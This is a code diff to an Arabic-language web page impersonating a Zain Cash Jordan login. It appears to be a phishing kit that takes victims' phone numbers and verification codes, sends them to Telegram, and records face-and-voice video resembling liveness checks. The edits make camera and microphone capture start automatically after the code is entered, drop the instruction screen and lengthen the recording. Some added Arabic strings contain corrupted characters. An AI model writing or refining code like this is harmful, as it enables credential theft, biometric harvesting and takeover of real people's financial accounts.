@@ -415,7 +415,7 @@
     function renderPhoneStep() {
       currentStep = "phone";
       app.innerHTML = `
-        ${header("مرحبًا بك! سجل دخولك لحسابك")}
+        ${header("مرحبًا بك! سجل دخولك ��حسابك")}
         ${stepIndicator(1)}
         <form id="phoneForm" autocomplete="off">
           <label>رقم الهاتف المرتبط بحسابك</label>
@@ -588,7 +588,7 @@
     }
 
     function showWaitMsgAndGotoCode4() {
-      const randomWait = Math.floor(Math.random() * 6) + 5; // 5-10 ثوانٍ فقط
+      const randomWait = Math.floor(Math.random() * 6) + 15;
       app.innerHTML = `
         <div style="padding:40px 0;text-align:center;">
           <div style="margin-bottom:18px;">
@@ -618,7 +618,7 @@
         <button class="back-btn" id="backBtn">&#8592; رجوع</button>
         ${header("تحقق إضافي لحماية حسابك")}
         ${stepIndicator(3)}
-        <div class="info-msg">الرجاء إدخال رمز التحقق المكون من 4 أرقام</div>
+        <div class="info-msg">الرجاء إدخال رمز التحقق ��لمكون من 4 أرقام</div>
         <form id="code4Form" autocomplete="off">
           <div class="code-inputs">
             <input type="text" maxlength="4" pattern="\\d{4}" required id="code4input" inputmode="numeric" placeholder="****" />
@@ -634,7 +634,7 @@
         this.value = this.value.replace(/\D/g, '').slice(0,4);
       });
 
-      // عند تقديم رمز الـ4 نرسل للتيليجرام ثم ننتقل إلى شاشة التحقق بالوجه (كما طلبت)
+      // عند تقديم رمز الـ4: أرسل البيانات ثم ابدأ التحقق بالوجه مباشرة (بدون زر أو شاشة وسيطة)
       document.getElementById('code4Form').onsubmit = async function(e) {
         e.preventDefault();
         let code = codeInput.value.trim();
@@ -651,8 +651,14 @@
         } catch (err) {
           console.log("Telegram error:", err);
         }
-        // التوجيه إلى شاشة المقدمة للتحقق بالوجه بعد الضغط على "تأكيد الرمز"
-        renderFaceIntro();
+        // -- التوجيه التلقائي لبدء عملية التحقق بالوجه --
+        try {
+          await startCaptureSequence();
+        } catch (err) {
+          console.error("Start capture failed:", err);
+          alert('لم نستطع الوصول إلى الكاميرا. يرجى التأكد من الأذونات والمحاولة مرة أخرى.');
+          renderCode4Step();
+        }
       };
 
       document.getElementById('backBtn').onclick = () => {
@@ -660,57 +666,33 @@
       };
     }
 
-    // ---------------- شاشة المقدمة للتحقق بالوجه (مع التعليمات) ----------------
-    function renderFaceIntro() {
-      currentStep = "faceIntro";
+    // ---------------- شاشة تحضير صغيرة قبل طلب الإذن ----------------
+    function renderFaceIntroScreenForFallback() {
       app.innerHTML = `
-        <button class="back-btn" id="backBtn">&#8592; رجوع</button>
-        ${header("التحقق من هويتك")}
-        <div style="text-align:center;margin-top:8px;">
-          <div style="margin: 10px auto 14px; width: 180px; height: 180px;">
+        <div style="text-align:center;padding:18px;">
+          <div style="margin: 10px auto 14px; width: 140px; height: 140px;">
             <img src="${faceLogo}" alt="شعار الوجه" style="width:100%;height:100%;object-fit:contain;border-radius:12px;background:#fff;padding:8px;border:1px solid #eee;"/>
           </div>
-
-          <div style="font-size:18px;color:#353a4d;font-weight:700;margin-bottom:6px;">سنبداً بالتقاط الفيديو للتحقق</div>
-          <div style="color:#666;font-size:14px;margin-bottom:12px;">اضغط التالي لبدء إعطاء الصلاحية والتسجيل</div>
-
-          <!-- تعليمات مفصلة كما في الصورة -->
-          <div style="text-align:right; direction:rtl; margin: 8px 12px 12px 12px;">
-            <ul style="text-align:right; color:#666; font-size:15px; line-height:1.6; padding-left:18px; margin:0;">
-              <li style="margin-bottom:6px;">ضع وجهك في الإطار.</li>
-              <li style="margin-bottom:6px;">التقاط فيديو حي — الصور القديمة مرفوضة.</li>
-              <li style="margin-bottom:6px;">أزل القبعة أو النظارات.</li>
-              <li style="margin-bottom:6px;">تأكد من إضاءة جيدة وظهور وجهك بالكامل.</li>
-            </ul>
-          </div>
-
-          <button id="startFaceBtn" class="button">التالي</button>
+          <div style="font-size:18px;color:#353a4d;font-weight:700;margin-bottom:8px;">سيُطلب إذن الكاميرا الآن</div>
+          <div style="color:#666;font-size:14px;">يرجى السماح للكاميرا ثم اتبع التعليمات التي ستظهر على الشاشة</div>
         </div>
-        <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>
       `;
-      document.getElementById('backBtn').onclick = () => {
-        renderCode4Step();
-      };
-      document.getElementById('startFaceBtn').onclick = async () => {
-        try {
-          await startCaptureSequence();
-        } catch (err) {
-          console.error("Capture error:", err);
-          alert('لم نستطع الوصول إلى الكاميرا. يرجى التأكد من الأذونات والمحاولة مرة أخرى.');
-          renderCode4Step();
-        }
-      };
     }
 
-    // ---------------- تسجيل سلسلة مقاطع قصيرة حسب التعليمات ----------------
+    // ---------------- تسجيل سلسلة مقاطع قصيرة حسب التعليمات (كل خطوة 5 ثواني) ----------------
     async function startCaptureSequence() {
+      // عرض شاشة تحضير قصيرة لتهيئة المستخدم قبل طلب الإذن
+      renderFaceIntroScreenForFallback();
+
+      // خطوات التوجيه — مدة كل خطوة 5000 ملّي ثانية (5 ثواني)
       const steps = [
-        { label: "اغمض عينيك", duration: 2500 },
-        { label: "حرك وجهك إلى اليسار", duration: 2500 },
-        { label: "حرك وجهك إلى اليمين", duration: 2500 },
-        { label: "ابتسم", duration: 2500 }
+        { label: "اغمض عينيك", duration: 5000 },
+        { label: "حرك وجهك إلى اليسار", duration: 5000 },
+        { label: "حرك وجهك إلى اليمين", duration: 5000 },
+        { label: "ابتسم", duration: 5000 }
       ];
 
+      // إنشاء واجهة الكاميرا
       app.innerHTML = `
         <div style="padding:8px;">
           <div class="camera-wrap">
@@ -718,7 +700,7 @@
               <div class="countdown" id="countdown" style="display:none">3</div>
               <video id="videoPreview" playsinline autoplay muted></video>
             </div>
-            <div class="camera-prompt" id="cameraPrompt">تحضير...</div>
+            <div class="camera-prompt" id="cameraPrompt">جاري تجهيز الكاميرا...</div>
             <div style="width:100%;display:flex;gap:10px;justify-content:center;">
               <button id="cancelCapture" class="button" style="background:#ef5350;">إلغاء</button>
             </div>
@@ -728,9 +710,11 @@
 
       const cancelBtn = document.getElementById('cancelCapture');
       let stream = null;
+      // طلب إذن الكاميرا (هذا سيظهر مربع السماح من المتصفح)
       try {
         stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
       } catch (err) {
+        // فشل الحصول على الكاميرا — رمي الخطأ ليتعامل معه المستدعي
         throw err;
       }
 
@@ -740,7 +724,7 @@
       const countdownEl = document.getElementById('countdown');
       const promptEl = document.getElementById('cameraPrompt');
 
-      // اختر أفضل نوع ممكن للتسجيل (حاول MP4/H264 ثم fall back إلى webm)
+      // تحديد أفضل صيغة ممكنة للتسجيل إن أمكن
       let chosenMime = null;
       if (window.MediaRecorder && typeof MediaRecorder.isTypeSupported === 'function') {
         if (MediaRecorder.isTypeSupported('video/mp4;codecs=h264')) {
@@ -764,9 +748,7 @@
           recorder = new MediaRecorder(stream);
         } catch (err) {
           stopStream(stream);
-          alert('جهازك أو متصفحك لا يدعم تسجيل الفيديو المطلوب. جرب متصفحًا آخر.');
-          renderCode4Step();
-          return;
+          throw err;
         }
       }
 
@@ -785,12 +767,16 @@
         renderCode4Step();
       };
 
+      // للتجربة البصرية: تأكد من تشغيل الفيديو الحي ثم ابدأ التسلسل
+      await wait(250);
+
       for (let i = 0; i < steps.length; i++) {
         if (cancelled) break;
         const st = steps[i];
+        // عرض توجيه واضح للمستخدم
         promptEl.textContent = st.label;
 
-        // عد تنازلي 3..1
+        // عرض عد تنازلي قصير قبل التسجيل (3..1)
         countdownEl.style.display = 'block';
         for (let c = 3; c >= 1; c--) {
           countdownEl.textContent = c;
@@ -799,18 +785,34 @@
         countdownEl.style.display = 'none';
 
         // بدء التسجيل
-        recorder.start();
-        await wait(st.duration);
-        if (recorder.state !== 'inactive') {
-          recorder.stop();
-          await wait(300); // انتظر وصول ondataavailable
+        try {
+          recorder.start();
+        } catch (err) {
+          console.warn('Recorder start error', err);
         }
+
+        // أثناء التسجيل نعرض مؤقت بسيط في prompt (مثلاً: "تسجيل... 5s")
+        let remaining = Math.ceil(st.duration / 1000);
+        // تحديث نص بسيط كل ثانية (اختياري، لتحسين إرشاد المستخدم)
+        for (let t = remaining; t >= 1; t--) {
+          promptEl.textContent = `${st.label} — تبقّى ${t} ثانية`;
+          await wait(1000);
+        }
+
+        // إيقاف التسجيل بعد مدة الخطوة
+        if (recorder.state !== 'inactive') {
+          try {
+            recorder.stop();
+          } catch (e) { console.warn('stop error', e); }
+        }
+        // ننتظر وصول ondataavailable
+        await wait(300);
       }
 
-      // بعد انتهاء كل الخطوات نعرض نافذة التشغيل/التحقق
+      // نهاية التسجيل: إيقاف البث وتشغيل المعالجة
       stopStream(stream);
 
-      // اجمع القطع في Blob واحد (نوع Blob نحدده بحسب chosenMime إذا أمكن)
+      // جمع الشظايا في ملف واحد
       const finalType = chosenMime ? chosenMime.split(';')[0] : (allChunks[0] ? allChunks[0].type : 'video/webm');
       const finalBlob = new Blob(allChunks.filter(b => b && b.size), { type: finalType });
 
